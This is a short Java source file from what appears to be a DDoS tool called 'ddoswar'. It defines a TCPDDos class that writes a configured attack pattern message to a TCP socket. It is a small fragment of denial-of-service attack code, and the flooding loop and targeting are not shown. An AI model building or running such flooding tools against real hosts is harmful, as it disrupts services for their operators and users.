package ua.cc.lajdev.ddoswar.protocols.implementations;

import ua.cc.lajdev.ddoswar.DDOSPattern;
import ua.cc.lajdev.ddoswar.protocols.interfaces.TCP;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;

/**
 * DDOS implementation for the TCP protocol.
 *
 */
public class TCPDDos extends TCP {

    /**
     * Constructor.
     * Create a TCP DDOS with a specified DDOS Pattern.
     *
     * @param ddosPattern
     */
    public TCPDDos(DDOSPattern ddosPattern) {
        super(ddosPattern);
    }

    @Override
    public void writeLineToSocket(String message) {
        try (BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(getSocket().getOutputStream()))) {
            bw.write(getDdosPattern().getMessage());
            bw.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
